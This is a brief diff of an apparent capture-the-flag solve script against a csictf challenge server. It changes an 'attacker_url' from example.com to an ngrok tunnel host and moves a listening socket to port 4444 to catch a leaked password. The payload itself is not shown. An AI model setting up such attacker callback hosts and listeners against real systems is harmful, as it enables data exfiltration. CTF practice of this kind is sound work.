@@ -6,7 +6,7 @@ import requests as req
 
 charset = '{_}' + string.ascii_lowercase + string.digits + string.ascii_uppercase
 
-attacker_url = "http://example.com"
+attacker_url = "http://068e8e9864fd.ngrok.io"
 url = "http://chall.csivit.com:30256"
 
 
@@ -25,7 +25,7 @@ password = "csictf"
 
 # Set a listening socket to check for password
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(("0.0.0.0", 80))
+sock.bind(("0.0.0.0", 4444))
 sock.listen()
 sock.settimeout(2)
 
